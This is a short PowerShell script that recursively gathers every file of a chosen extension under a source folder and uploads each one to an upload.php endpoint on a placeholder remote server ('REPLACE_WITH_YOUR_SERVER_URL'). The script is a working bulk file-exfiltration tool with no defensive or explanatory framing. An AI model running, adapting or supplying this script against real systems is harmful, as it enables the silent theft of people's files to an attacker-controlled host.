param ($src , $ext)

#$files =  Get-ChildItem -Recurse -filter "*" -LiteralPath $src  | Where-Object {$_.Extension -eq $ext}
$files =  Get-ChildItem  -Recurse $src\*  -Include  $ext
$test = (New-Object System.Net.Webclient);
foreach ($file in $files)
{
   $test.UploadFile('http://REPLACE_WITH_YOUR_SERVER_URL/upload.php', $file.FullName)
}